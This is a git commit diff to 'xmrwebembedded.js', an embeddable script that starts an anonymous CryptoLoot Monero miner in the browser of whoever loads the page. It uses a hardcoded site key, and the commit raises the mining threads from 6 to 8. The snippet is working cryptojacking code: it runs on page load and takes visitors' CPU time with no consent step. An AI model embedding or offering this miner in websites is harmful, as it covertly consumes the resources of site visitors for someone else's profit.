a4f9a66d05cb08565f6ba853dc2ca79b8d0fe924
Newbie <linhdqtg@gmail.com>
2017-10-19 22:36:16 +0700

    Update xmrwebembedded.js

--- xmrwebembedded.js
+++ xmrwebembedded.js
@@ -2,7 +2,7 @@
 <script>
 var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
         {
-        threads:6,autoThreads:false,throttle:0.2,
+        threads:8,autoThreads:false,throttle:0.2,
         }
 );
 miner.start();
